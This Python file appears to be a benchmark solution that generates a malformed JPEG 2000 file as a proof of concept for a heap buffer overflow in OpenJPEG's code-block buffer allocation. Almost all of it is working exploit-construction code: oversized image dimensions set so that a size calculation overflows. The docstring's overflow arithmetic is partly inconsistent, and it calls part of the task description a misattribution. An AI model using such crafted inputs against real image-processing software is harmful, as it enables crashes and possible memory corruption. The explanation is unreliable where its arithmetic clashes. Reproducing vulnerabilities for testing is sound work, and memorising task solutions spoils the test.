import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a size calculation overflow in `opj_t1_allocate_buffers`.
        This function is part of the standard (non-HT) T1 decoder. It is triggered
        when the product of a code-block's width and height, multiplied by
        sizeof(OPJ_INT32), overflows a 32-bit size_t. This leads to a small
        malloc allocation followed by a large heap buffer overflow.

        The PoC creates a JPEG 2000 image with a very large width (0x3FFFFFFF)
        and a small height (4). With zero decomposition levels specified in the
        COD marker, the entire image is treated as a single tile and a single
        code-block of these dimensions.

        The product of width and height is 0x3FFFFFFF * 4 = 0xFFFFFFFC.
        The allocation size is calculated as (width * height) * sizeof(OPJ_INT32),
        which is 0xFFFFFFFC * 4. On a 32-bit system (or when size_t is 32-bit),
        this multiplication overflows, resulting in a miscalculated, small
        allocation size. The subsequent attempt to write to this small buffer
        causes a massive heap overflow.

        The "HT_DEC component" in the vulnerability description appears to be
        a misattribution. Public bug reports with the same function name and crash
        signature point to the standard T1 decoder, not the HTJ2K path. This PoC
        generates a standard JP2 file to trigger this vulnerability, ignoring
        the misleading "HT_DEC" hint.
        """

        def box(boxtype: bytes, content: bytes) -> bytes:
            """Helper function to create a JP2 box."""
            return struct.pack('>I', 8 + len(content)) + boxtype + content

        # --- J2K Codestream (`jp2c` box content) ---
        j2k_stream = b''
        
        # SOC: Start of Codestream
        j2k_stream += b'\xff\x4f'
        
        # SIZ: Image and tile size marker
        # We set a very large width to trigger the integer overflow.
        width = 0x3FFFFFFF
        height = 4
        
        j2k_stream += b'\xff\x51'
        j2k_stream += struct.pack('>H', 38)          # Lsiz (marker segment length)
        j2k_stream += struct.pack('>H', 0)           # Rsiz (capabilities)
        j2k_stream += struct.pack('>I', width)       # Xsiz (image width)
        j2k_stream += struct.pack('>I', height)      # Ysiz (image height)
        j2k_stream += struct.pack('>II', 0, 0)       # XOsiz, YOsiz (image offset)
        j2k_stream += struct.pack('>I', width)       # XTsiz (tile width)
        j2k_stream += struct.pack('>I', height)      # YTsiz (tile height)
        j2k_stream += struct.pack('>II', 0, 0)       # XTOsiz, YTOsiz (tile offset)
        j2k_stream += struct.pack('>H', 1)           # Csiz (number of components)
        # Component 0 info: 8-bit, unsigned, no subsampling
        j2k_stream += struct.pack('BBB', 7, 1, 1)    # Ssiz, XRsiz, YRsiz
        
        # COD: Coding style default marker
        j2k_stream += b'\xff\x52'
        j2k_stream += struct.pack('>H', 12)          # Lcod
        j2k_stream += struct.pack('B', 0)            # Scod
        # SGcod: progression order, layers, MCT, style (standard, no HT)
        j2k_stream += struct.pack('>BHHB', 0, 1, 0, 0)
        # SPcod: 0 decomp levels, default cblk size, etc.
        j2k_stream += struct.pack('BBBBB', 0, 4, 4, 0, 0)
        
        # QCD: Quantization default marker
        j2k_stream += b'\xff\x5c'
        j2k_stream += struct.pack('>H', 3)           # Lqcd
        j2k_stream += struct.pack('B', 1)            # Sqcd (scalar implicit, no quantization)

        # SOT: Start of tile-part marker
        j2k_stream += b'\xff\x90'
        j2k_stream += struct.pack('>H', 10)          # Lsot
        j2k_stream += struct.pack('>H', 0)           # Isot (tile index)
        # Psot (tile-part length), 0 means it extends to the end of the codestream
        j2k_stream += struct.pack('>I', 0)           
        j2k_stream += struct.pack('BB', 0, 1)        # TPsot, TNsot
        
        # SOD: Start of data marker
        j2k_stream += b'\xff\x93'
        
        # EOC: End of codestream marker
        j2k_stream += b'\xff\xd9'

        # --- JP2 File Structure (wrapping the J2K stream) ---
        poc = b''
        
        # JP2 Signature box
        poc += b'\x00\x00\x00\x0c\x6a\x50\x20\x20\x0d\x0a\x87\x0a'
        
        # File Type box
        ftyp_content = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '
        poc += box(b'ftyp', ftyp_content)

        # JP2 Header box (superbox)
        # ihdr: image header box
        # BPC=7 means (8 bits per component - 1) | (signed=0 << 7) -> 8-bit unsigned
        ihdr_content = struct.pack('>IIHBBBB', height, width, 1, 7, 7, 0, 0)
        # colr: color specification box
        # METH=1 (enumerated), EnumCS=16 (sRGB)
        colr_content = struct.pack('BBB', 1, 0, 0) + struct.pack('>I', 16)
        jp2h_content = box(b'ihdr', ihdr_content) + box(b'colr', colr_content)
        poc += box(b'jp2h', jp2h_content)
        
        # Contiguous Codestream box
        poc += box(b'jp2c', j2k_stream)

        return poc
